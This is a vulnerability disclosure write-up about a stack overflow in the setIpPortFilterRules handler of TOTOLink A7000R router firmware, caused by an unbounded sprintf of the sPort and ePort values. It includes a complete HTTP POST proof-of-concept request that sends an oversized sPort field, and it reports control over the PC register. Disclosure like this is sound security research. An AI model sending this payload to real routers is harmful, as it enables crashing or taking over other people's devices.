# TOTOLink A7000R V9.1.0u.6115_B20201022has a stack overflow vulnerability

## Overview

- Firmware download address: https://totolink.cn/home/menu/detail.html?menu_listtpl=download&id=9&ids=36
- Manufacturer's website information：https://www.totolink.net/

## Product Information

TOTOLink A7000R V9.1.0u.6115_B20201022 router, the latest version of simulation overview：

![image-20231122042242563](image/image-20231122042242563.png)

## Vulnerability details

![image-20231122042334071](image/image-20231122042334071.png)

In setIpPortFilterRules function

`v8 v9` is formatted into `V16` through sprintf function, and` v8 v9` is the value of `sPort ePort`  we enter. The size of the format string is not limited, resulting in stack overflow.

## Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 78
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/basic/index.html
Cookie: SESSION_ID=2:1700540000:2

{

"topicurl":"setIpPortFilterRules",

"addEffect":"1",

"sPort":"a"*0x1000

}
```

![image-20231122042807502](image/image-20231122042807502.png)

The above figure shows the POC attack effect

![image-20231122042842213](image/image-20231122042842213.png)

As shown in the figure above, we can hijack PC registers.

![image-20231122042917776](image/image-20231122042917776.png)